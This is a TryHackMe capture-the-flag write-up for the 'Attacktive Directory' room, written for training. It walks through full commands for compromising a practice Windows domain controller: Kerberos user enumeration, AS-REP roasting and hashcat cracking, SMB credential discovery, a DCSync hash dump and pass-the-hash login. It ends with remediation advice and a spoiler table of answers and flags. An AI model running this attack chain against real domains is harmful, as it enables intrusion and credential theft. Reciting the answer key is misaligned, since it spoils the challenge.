> **Lab:** TryHackMe — Attacktive Directory  
> **Link**: https://tryhackme.com/room/attacktivedirectory
> **Local host:** `192.168.133.108`  
> **Target:** 10.48.173.24
> Domain: `spookysec.local`
> Demain Contoller: `AttacktiveDirectory.spookysec.local`
> **Scope:** Network scanning, Active Directory enumeration, Kerberos user enumeration, AS-REP roasting, password cracking, SMB share enumeration, credential discovery, DCSync attack, NTLM hash extraction, and remote access.
```table-of-contents
```
---
# 1. Port Scanning and Service Enumeration

Let's start by checking TCP open ports using RustScan

```bash
rustscan -a 10.48.173.24 -b 1000 --timeout 1500 -- -n -Pn
```

![Pasted image 20261021133359](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021133359.png)

Since the target have quite a few open port, we might as well save them to a file for quickly nmap enumeration.

```bash
rustscan -a 10.48.173.24 -b 1000 --timeout 1500 -g | awk -F'->' '{print $2}' | tr -d '[]' > ports.txt
```

Also check top 100 UDP ports to see if there anything interesting can be found.

```bash
sudo nmap -sU --top-ports 100 --max-retries 1 --min-rate 1000 -v 10.48.173.24
```

![Pasted image 20261021133512](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021133512.png)

After add port 123 to ports.txt, let enumerate the open port with default nmap script.

```bash
sudo nmap -sV -sC -O -p $(cat ports.txt) -T4 10.48.173.24 -oA service
```

![Pasted image 20261021133828](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021133828.png)

So many interesting find, let also run enum4linux-ng to see if there anything miss from nmap.

```bash
enum4linux-ng -A 10.48.173.24
```

![Pasted image 20261021133802](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021133802.png)

> **Finding**
> Based on the initial scan results, we have identified critical infrastructure details that confirm the target is a **Windows Domain Controller (DC)**
> 
> Some of the key finding are:
> 
> 1. Core Authentication & Active Directory Services
> 
> - **Port 88 (Kerberos):** Confirms the machine's identity as a Domain Controller. This serves as our primary target for user enumeration, password spraying, and Kerberoasting attacks.
> - **Port 464 (kpasswd5):** Provides secondary confirmation of an active, functioning Kerberos infrastructure.
> - **Port 3268 (LDAP Global Catalog):** Indicates the Active Directory database can be queried directly to dump users, groups, and domain policies once we obtain valid credentials.
> 
> 2. Immediate Information Leaks (Target Mapping)
> 
> - **Port 3389 (RDP):** This is our most valuable initial source of information. Through the NLA (Network Level Authentication) handshake, the port leaked the following critical environment details:
>     - **NetBIOS Machine Name:** `THM-AD`
>     - **Active Directory Realm / Domain:** `spookysec.local`
>     - **Fully Qualified Domain Name (FQDN) / KDC:** `AttacktiveDirectory.spookysec.local`
> 
> 3. Legacy & Remote Procedure Services
> 
> - **Ports 135 (MSRPC), 139 (NetBIOS), 445 (SMB), and 593 (RPC-over-HTTP):** These ports are fully exposed. They provide a massive attack surface for anonymous share hunting, RPC user enumeration, and potential lateral movement or remote code execution (RCE) later in the assessment.
# 2. Configure Local Name Resolution

Let's add the domain controller's hostname and domain to our local /etc/hosts file first.

```bash
echo "10.48.173.24  spookysec.local AttacktiveDirectory.spookysec.local" | sudo tee -a /etc/hosts > /dev/null
```

# 3. Enumerate Valid Domain Users

Before trying authentication attacks, we need a list of valid usernames. Which we can use the username list provided for this lab to enumerate the valid username using kerbrute through kerberos.

```bash
kerbrute userenum --dc AttacktiveDirectory.spookysec.local -d spookysec.local userlist.txt
```

Now, we get a list of valid usernames.

![Pasted image 20261020201807](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261020201807.png)

Let add them to a list.

![Pasted image 20261021140616](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021140616.png)

# 4. AS-REP Roasting

Next, let's check whether any domain accoutns can be queried from kerberos AS-REP responses without pre-authentication.

```bash
python3 /opt/impacket/examples/GetNPUsers.py spookysec.local/ -usersfile user.txt -dc-ip AttacktiveDirectory.spookysec.local -no-pass
```

Found one account vulnerable to AS-REP roasting. Seem like kerberos pre-authentication was disabled for this account.

![Pasted image 20261021140638](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021140638.png)

## **Identify the hash Type**

Let check its format first before we can cracking this password hash.

![Pasted image 20261021142553](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021142553.png)

![Pasted image 20261021142546](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021142546.png)

Double check in https://hashcat.net/wiki/doku.php?id=example_hashes

![Pasted image 20261021140936](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021140936.png)

> **Hash Detail**
> After repeatedly verify its detail using two difference method, we can confirm its:
> **Hash name:** Kerberos 5 AS-REP etype 23
> **Hash mode:** 18200

Run hashcat on my windows PC with dedicate GPU to crack this password using the provided password list.

```bash
./hashcat -m 18200 hash.txt passwordlist.txt
```

![Pasted image 20261021140824](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021140824.png)

> **svc-admin's credential**
> **Account:** svc-admin
> **Password:** management2005

Let's see what this account can access.

# 5. Enumerate SMB Shares

Now that we got a valid credentails, we can enumerate the SMB shares availbel on the domain controller.

First let use what already available on any kali: smbmap to check our access permissions.

```bash
smbmap -u svc-admin -p 'management2005' -d spookysec.local -H AttacktiveDirectory.spookysec.local
```

![Pasted image 20261021145414](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021145414.png)

Interesting! In addition to the usual administrative and default shares, there's a `backup` share worth investigating.

Let's connect to the SMB server using Impacket's SMB client.

```bash
smbclient.py spookysec.local/svc-admin:'management2005'@AttacktiveDirectory.spookysec.local
```

![Pasted image 20261021145656](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021145656.png)

There's a single file with clear identity from its name in backup share, let download it to our machine.

Since it's a Base64 string, let decoded it first to see what it's about.

**Decoding the Base64 string**
![Pasted image 20261021153046](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021153046.png)

> **backup's credential**
> **Account:** backup
> **Password:** backup2517860

Now we get another valid credential to process to further step.

# 6. DCSync Attack

The lab provides a clear clue that the `backup` account is the backup of the domain controller. That makes its domain replication permissions worth checking.

If an account has the necessary directory replication rights, it may be able to perform a **DCSync attack** and request password data from Active Directory as though it were a domain controller.

Let's use Impacket's `secretsdump.py` to test this.

```bash
secretsdump.py spookysec.local/backup:'backup2517860'@10.48.173.24
```

![Pasted image 20261021155027](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021155027.png)

> **Administrators NTLM**
> 0e0363213e37b94221497260b0bcb4fc

The output includes domain account credential material, including NTLM hashes where the account and permissions allow it.
# 7. Remote Access with Administrator Credentials

With the Administrator's NTLM hash obtained, we can attempt remote access using Evil-WinRM and pass-the-hash authentication.

```bash
evil-winrm -i AttacktiveDirectory.spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

![Pasted image 20261021161552](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021161552.png)

# 8. Testing RDP Access

Since port `3389` is open, we can also test whether the discovered accounts are permitted to log in through Remote Desktop Protocol (RDP).

First, try the `svc-admin` account:

```
xfreerdp /u:svc-admin /p:'management2005' /d:spookysec.local /v:AttacktiveDirectory.spookysec.local /dynamic-resolution +clipboard
```

![Pasted image 20261021154102](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021154102.png)

And, `backup` account:

```bash
xfreerdp /u:backup /p:'backup2517860' /d:spookysec.local /v:AttacktiveDirectory.spookysec.local /dynamic-resolution +clipboard
```

![Pasted image 20261021153752](Image/Tryhackme%20-%20Attacktive%20Directory/Pasted%20image%2020261021153752.png)

```
xfreerdp /u:Administrator /p:'management2005' /d:spookysec.local /v:AttacktiveDirectory.spookysec.local /dynamic-resolution +clipboard
```

Funny enough, the administrator remote login using using NTLM hash fail and it seem that the machine at least not allow login without password.

> **Notes and Takeaways**
> - **Kerbrute** helps identify valid domain usernames.
>     
> - **AS-REP roasting** targets accounts that do not require Kerberos pre-authentication.
>     
> - **Hashcat** can crack captured Kerberos responses offline when the password is weak enough.
>     
> - **SMB enumeration** can expose additional shares and sensitive files.
>     
> - **DCSync** abuses directory replication permissions to retrieve credential material from Active Directory.
>     
> - **Pass-the-hash** can provide access without recovering the plaintext password when the target service supports NTLM authentication.

# 9. Defensive Remediation & Mitigations

> **Info**
> To secure the Active Directory environment against the attack vectors demonstrated in this assessment, the following remediation steps are recommended:
> 
> - **Enforce Kerberos Pre-Authentication:** Enable pre-authentication for domain accounts and audit accounts configured to disable it, reducing exposure to AS-REP roasting.
>     
> - **Strengthen Account Credentials:** Enforce long, unique passwords and monitor for password spraying and offline password-cracking risks.
>     
> - **Restrict SMB Share Access:** Apply least-privilege permissions to network shares and prevent sensitive credentials from being stored in readable backup files.
>     
> - **Remove Excessive Replication Privileges:** Audit accounts with directory replication rights and restrict DCSync-capable permissions to explicitly authorized identities.
>     
> - **Protect Privileged Credentials:** Rotate compromised credentials, investigate exposed NTLM hashes, and use privileged access controls to limit domain administrator exposure.

# 10. Challenge Answer

<details>
<summary>Spoiler Warning!</summary>


| Question                                                                                                                                  | Answer                                           |
| ----------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| What tool will allow us to enumerate port 139/445?                                                                                        | enum4linux                                       |
| What is the NetBIOS-Domain Name of the machine?                                                                                           | THM-AD                                           |
| What invalid TLD do people commonly use for their Active Directory Domain?                                                                | .local                                           |
| What command within Kerbrute will allow us to enumerate valid usernames?                                                                  | userenum                                         |
| What notable account is discovered? (These should jump out at you)                                                                        | svc-admin                                        |
| What is the other notable account is discovered? (These should jump out at you)                                                           | backup                                           |
| We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password? | svc-admin                                        |
| Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)               | Kerberos 5 AS-REP etype 23                       |
| What mode is the hash?                                                                                                                    | 18200                                            |
| Now crack the hash with the modified password list provided, what is the user accounts password?                                          | management2005                                   |
| What utility can we use to map remote SMB shares?                                                                                         | smbclient                                        |
| Which option will list shares?                                                                                                            | -L                                               |
| How many remote shares is the server listing?                                                                                             | 6                                                |
| There is one particular share that we have access to that contains a text file. Which share is it?                                        | backup                                           |
| What is the content of the file?                                                                                                          | YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw |
| Decoding the contents of the file, what is the full contents?                                                                             | backup@spookysec.local:backup2517860             |
| What method allowed us to dump NTDS.DIT?                                                                                                  | DRSUAPI                                          |
| What is the Administrators NTLM hash?                                                                                                     | 0e0363213e37b94221497260b0bcb4fc                 |
| What method of attack could allow us to authenticate as the user without the password?                                                    | Pass The Hash                                    |
| Using a tool called Evil-WinRM what option will allow us to use a hash?                                                                   | -H                                               |
| svc-admin                                                                                                                                 | TryHackMe{K3rb3r0s_Pr3_4uth}                     |
| backup                                                                                                                                    | TryHackMe{B4ckM3UpSc0tty!}                       |
| Administrator                                                                                                                             | TryHackMe{4ctiveD1rectoryM4st3r}                 |

</details>
